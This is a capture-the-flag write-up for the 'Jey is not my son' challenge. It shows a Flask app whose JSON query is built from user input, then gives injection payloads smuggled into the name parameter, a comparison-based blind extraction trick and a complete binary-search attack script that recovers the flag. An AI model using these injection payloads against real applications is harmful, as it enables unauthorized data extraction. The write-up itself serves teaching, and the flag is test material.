# Jey is not my son

```
Find the year the flag was created, that’s the answer you seek. But beware: Jey is not not my son.

https://fortid-jey-is-not-my-son.chals.io/
```

Server code:

```python
from flask import Flask, render_template, request
from jsonquerylang import jsonquery
import json
import string

app = Flask(__name__)

with open('data.json') as f:
    data = json.load(f)

def count_baby_names(name: str, year: int) -> int:
    query = f"""
                .collection
                    | filter(.Name == "{name}" and .Year == "{year}")
                    | pick(.Count)
                    | map(values())
                    | flatten()
                    | map(number(get()))
                    | sum()
            """
    output = jsonquery(data, query)
    return int(output)

def contains_digit(name: str) -> bool:
    for num in string.digits:
        if num in name:
            return True
    return False


@app.route("/", methods=["GET"])
def home():
    name = None
    year = None
    result = None
    error = None

    name = request.args.get("name", default="(no name)")
    year = request.args.get("year", type=int)

    if not name or contains_digit(name):
        error = "Please enter a name."
    elif not year:
        error = "Please enter a year."
    else:
        if year < 1880 or year > 2025:
            error = "Year must be between 1880 and 2025."
        try:
            result = count_baby_names(name=name, year=year)
        except Exception as e:
            error = f"Unexpected error: {e}"

    return render_template("index.html", name=name, year=year, count=result, error=error)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

There is a json query injection:

```
| filter(.Name == "{name}" and .Year == "{year}")
```

We can construct the following query to skip over the year check:

```python
import json
from jsonquerylang import jsonquery

data = json.loads("""
{
  "collection": [
    {"Name": "Alice", "Year": "2020", "Count": 100},
    {"Name": "Bob", "Year": "2020", "Count": 200},
    {"Name": "flag", "Year": "FortID{a1b2c3d4}", "Count": 300}
  ]
}
""")

def test(name, year):
    query = f"""
                .collection
                    | filter(.Name == "{name}" and .Year == "{year}")
                    | pick(.Count)
                    | map(values())
                    | flatten()
                    | map(number(get()))
                    | sum()
            """
    print(jsonquery(data, query))

name = 'flag") | filter(.Name not in [] or .Name == "'
year = 2019
test(name, year)
```

Through this, we can confirm that there is an entry called `flag` online. Then, we need to extract its year field. However, it is a string field, so we cannout return the integer directly. Instead, we use string comparison operator:

```python
name = 'flag") | map({Count: "FortID" >= .Year}) | filter(.Name not in [] or .Name == "'
year = 2019
test(name, year) # prints 0.0

name = 'flag") | map({Count: "FortIE" >= .Year}) | filter(.Name not in [] or .Name == "'
year = 2019
test(name, year) # prints 1.0
```

So we can use binary search to recover the flag. However, we cannot use integers. We can use `string()` to construct arbitrary integer:

```python
string((""!="")+(""!="")+(""=="")+(""=="")+(""==""))
# becomes
string(0+0+1+1+1)
# becomes
"3"
```

Attack script:

```python
import requests
import urllib
from jsonquerylang import jsonquery

flag = "FortID{"

alphabet = "#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~"

while "}" not in flag:
    lo = 0
    hi = len(alphabet)
    while lo + 1 < hi:
        mi = (lo + hi) // 2
        ch = alphabet[mi]
        temp = flag + ch
        encoded = ""
        for c in temp:
            if c >= "0" and c <= "9":
                encoded += (
                    '"+string('
                    + "+".join(['(""!="")'] * 2 + ['(""=="")'] * (ord(c) - ord("0")))
                    + ')+"'
                )
                pass
            else:
                encoded += c

        name = (
            'flag") | map({Count: .Year >= ("'
            + encoded
            + '")}) | filter(.Name not in [] or .Name == "'
        )
        year = 2020

        r = requests.get(
            "https://fortid-jey-is-not-my-son.chals.io/?"
            + urllib.parse.urlencode(
                {
                    "name": name,
                    "year": year,
                }
            )
        )
        for line in r.text.splitlines():
            if "time" in line:
                times = int(line.split()[-2].split(">")[1].split("<")[0])
                print(temp, times)
                if times == 1:
                    # greater
                    lo = mi
                elif times == 0:
                    # lower
                    hi = mi
                break
    flag += alphabet[lo]
```

Flag: `FortID{B3_th3_0n3_wh0_1s_n0t_b1ind_1n_th3_n3w_3r4}`.
